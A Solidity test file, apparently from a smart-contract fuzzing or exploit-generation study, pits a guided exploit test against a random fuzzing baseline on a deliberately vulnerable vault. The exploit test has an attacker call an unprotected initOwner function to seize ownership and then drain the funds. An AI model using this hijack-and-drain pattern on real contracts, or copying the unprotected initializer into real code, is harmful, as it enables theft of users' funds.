// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/UnprotectedVault.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function prank(address who) external;
}

contract UnprotectedVaultTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    UnprotectedVault vault;
    address constant DEPLOYER = address(0xAAAA);
    address constant ATTACKER = address(0xBEEF);

    function setUp() public {
        vm.prank(DEPLOYER);
        vault = new UnprotectedVault();
        vm.deal(address(vault), 10 ether);
    }

    // [Mode B: PRISM Guided Exploit Generator]
    // Exploits unprotected initOwner to hijack contract ownership and drain funds
    function testGuidedExploit() public {
        vm.prank(ATTACKER);
        vault.initOwner(ATTACKER);
        require(vault.owner() == ATTACKER, "Ownership hijacked");
        vm.prank(ATTACKER);
        vault.emergencyDrain();
        // Authorization Invariant Violation: Vault drained by unauthorized caller
        require(address(vault).balance == 0, "Authorization invariant violated by exploit");
    }

    // [Mode A: Baseline Unconstrained Random Fuzzing]
    // Unconstrained benign deposits and user calls across state space
    function testRandomFuzz(uint256 rawAmount) public {
        uint256 amount = (rawAmount % 5 ether) + 1;
        address user = address(uint160(uint256(keccak256(abi.encodePacked(rawAmount)))));
        vm.deal(user, amount);
        vm.prank(user);
        vault.deposit{value: amount}();
        // Invariant: Creator ownership remains intact
        require(vault.owner() == DEPLOYER, "Owner authorization preserved under random interactions");
    }

    receive() external payable {}
}
